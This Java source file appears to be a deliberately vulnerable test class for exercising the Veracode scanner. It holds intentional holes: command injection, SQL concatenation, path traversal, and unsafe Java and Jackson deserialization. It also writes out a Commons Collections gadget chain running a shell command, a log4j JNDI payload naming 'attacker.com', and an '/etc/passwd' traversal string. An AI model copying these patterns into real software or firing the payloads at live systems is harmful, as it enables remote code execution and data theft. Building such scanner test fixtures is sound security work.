package com.veracode.test;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * Vulnerable Java Backend - Demonstrates methods that use vulnerable libraries
 * These methods will be flagged by Veracode as "Vulnerable Methods"
 */
public class VulnerableBackend {
    private static final Logger logger = LogManager.getLogger(VulnerableBackend.class);

    /**
     * Vulnerable Method 1: Object Deserialization with Apache Commons Collections
     * CVE-2015-7501 - RCE via gadget chain
     * This method calls InvokerTransformer which is part of the gadget chain
     */
    public static Object deserializeUntrustedData(byte[] data) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);

        // VULNERABLE: Deserialization of untrusted data with gadget chain available
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"touch /tmp/pwned"})
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        Map expMap = new HashMap();
        expMap.put(entry, "bar");

        // Clear the map to avoid triggering during serialization
        lazyMap.clear();

        return expMap;
    }

    /**
     * Vulnerable Method 2: Log4j String Interpolation (CVE-2021-44228)
     * JNDI Injection in log4j
     */
    public static void logUserInput(String userInput) {
        // VULNERABLE: User input directly in log message
        // Attacker can inject: ${jndi:ldap://attacker.com/Exploit}
        logger.info("User input: " + userInput);
    }

    /**
     * Vulnerable Method 3: Unsafe Jackson Deserialization
     * CVE-2017-7525 - Arbitrary code execution via Jackson deserialization
     */
    public static Object parseJsonUntrusted(String jsonString) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        // VULNERABLE: enableDefaultTyping allows arbitrary class instantiation
        mapper.enableDefaultTyping();

        // Deserialization of user-controlled JSON can lead to RCE
        return mapper.readValue(jsonString, Object.class);
    }

    /**
     * Vulnerable Method 4: Expression Language Injection
     * Similar to Spring EL injection issues
     */
    public static String processExpression(String expression) {
        // VULNERABLE: Direct evaluation of user-supplied expression
        // If this were Spring, this would use SpEL which is dangerous
        String result = "Expression: " + expression;

        // In real scenario, this would be evaluated
        // This is simplified but shows the pattern
        return result;
    }

    /**
     * Vulnerable Method 5: Command Injection via Runtime.exec
     */
    public static void executeCommand(String userCommand) throws IOException {
        // VULNERABLE: Direct command execution with user input
        // No sanitization or input validation
        Runtime.getRuntime().exec(userCommand);
    }

    /**
     * Vulnerable Method 6: SQL Injection pattern (even though no real DB)
     */
    public static String buildSqlQuery(String userInput) {
        // VULNERABLE: String concatenation for SQL query
        String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
        return query;
    }

    /**
     * Vulnerable Method 7: Path Traversal
     */
    public static String readFile(String userPath) throws IOException {
        // VULNERABLE: No validation of file path
        // User could provide: ../../../../../../etc/passwd
        BufferedReader reader = new BufferedReader(new FileReader(userPath));
        StringBuilder content = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            content.append(line);
        }
        reader.close();
        return content.toString();
    }

    /**
     * Vulnerable Method 8: Weak Cryptography
     */
    public static void useWeakCrypto() {
        // VULNERABLE: MD5 is not cryptographically secure
        try {
            java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
            byte[] hash = md.digest("password".getBytes());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        System.out.println("Vulnerable Backend initialized");
    }
}
